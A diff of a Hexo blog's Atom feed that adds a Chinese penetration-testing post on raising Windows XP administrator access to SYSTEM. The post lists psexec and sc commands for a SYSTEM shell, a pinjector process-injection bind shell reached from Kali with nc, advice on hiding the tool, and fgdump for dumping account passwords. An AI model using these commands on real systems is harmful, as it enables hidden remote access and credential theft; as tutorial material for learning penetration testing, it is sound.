@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-03-27T15:09:10.195Z</updated>
+  <updated>2019-03-29T14:20:06.535Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windwos下的本地提权</title>
+    <link href="http://yoursite.com/2019/03/29/windwos%E4%B8%8B%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
+    <id>http://yoursite.com/2019/03/29/windwos下的本地提权/</id>
+    <published>2019-03-29T13:06:16.000Z</published>
+    <updated>2019-03-29T14:20:06.535Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="windows下的本地提权"><a href="#windows下的本地提权" class="headerlink" title="windows下的本地提权"></a>windows下的本地提权</h3><p>不管是在windows，Linux还是mac os下，用户都被分为几个等级，windows下的用户一般被分为来宾（guest）、普通用户、管理员及系统这几个用户。它和linux下有些不同。Linux下的root用户就是最高权限，包含了整个系统所有的权限。但在windows下administrator和system稍有不同。system包含了整个系统(包括administrator在内)的所有权限，除了一些administrator特有的权限。但是理论上说system才属于windows下的最高权限。所以在Windows下一般会把权限提升到system级别。</p><p><strong>注：本文的所有操作都是在用户已经是administrator的前提下。以windows xp系统作为演示。</strong></p><a id="more"></a><p>这些操作主要是靠一些已经存在并被使用的工具做到的。这些工具都可以在网上找到。</p><ol><li><h4 id="psexec-exe"><a href="#psexec-exe" class="headerlink" title="psexec.exe"></a>psexec.exe</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -i -s cmd //-i 交互式登录， -s 获得系统权限 。及打开一个有系统权限的cmd窗口</span><br></pre></td></tr></table></figure></li><li><h4 id="sc命令"><a href="#sc命令" class="headerlink" title="sc命令"></a>sc命令</h4><p>这是windows下的一个很强大的命令可以创建并运行服务。用它创建的服务打开的cmd本身就是一个system权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc create 服务名 binpath= &quot;cmd /k start&quot; type= own type= interact   </span><br><span class="line"></span><br><span class="line">sc start 服务名</span><br></pre></td></tr></table></figure><p>即可打开一个系统权限的cmd窗口。（不同的版本的windows最后的结果可能会有差距，以自己测试的系统为准。）</p></li><li><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><p>非常隐蔽的一种提权，也是用的最多一种方式，一般情况下只有使用procexp.exe 的工具才能找到它</p><p>同样把工具放到一个隐蔽的地方，在cmd里定位到那里。</p><p>先找一个长时间开启的进程，记下PID号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe -p PID cmd 12345</span><br></pre></td></tr></table></figure><p>通过kali去连接这个端口就会弹出system权限的cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv IP 端口号</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><h4 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h4><p>它kali下的一个工具，可以把它拷贝出来，在windows下运行，即可拿到系统的用户名密码。</p><p>这是它的运行后的结果</p><img src="/2019/03/29/windwos下的本地提权/1.png"><img src="/2019/03/29/windwos下的本地提权/2.png"><img src="/2019/03/29/windwos下的本地提权/3.png"></li></ol><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>​    或许有人会问已经拿到管理员权限为什么还要如此麻烦的提取到system权限。其实大多数服务器在设置管理员的时候一般不只一个，除了administrator用户可以直接同过以管理员身份运行外，其他用户都需要输入administrator用户的密码才可以做到这一操作。所以才会这么做。而且大多数情况下administrator用户是不允许远程登录的。所以拿到这个用户的密码也无济于事。另外，一般情况下我们渗透成果后拿到的都是终端，而非图形化界面。所以，很多操作并没有想象的那么简单。windows下的提权还可以使用mimikatz去提权。这也是一个很强大的工具，可以了解一下这个工具的使用方法及作用。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;windows下的本地提权&quot;&gt;&lt;a href=&quot;#windows下的本地提权&quot; class=&quot;headerlink&quot; title=&quot;windows下的本地提权&quot;&gt;&lt;/a&gt;windows下的本地提权&lt;/h3&gt;&lt;p&gt;不管是在windows，Linux还是mac os下，用户都被分为几个等级，windows下的用户一般被分为来宾（guest）、普通用户、管理员及系统这几个用户。它和linux下有些不同。Linux下的root用户就是最高权限，包含了整个系统所有的权限。但在windows下administrator和system稍有不同。system包含了整个系统(包括administrator在内)的所有权限，除了一些administrator特有的权限。但是理论上说system才属于windows下的最高权限。所以在Windows下一般会把权限提升到system级别。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注：本文的所有操作都是在用户已经是administrator的前提下。以windows xp系统作为演示。&lt;/strong&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="elevate privileges" scheme="http://yoursite.com/categories/elevate-privileges/"/>
+    
+    
+      <category term="penetration testing" scheme="http://yoursite.com/tags/penetration-testing/"/>
+    
+  </entry>
   
   <entry>
     <title>nessus的使用</title>
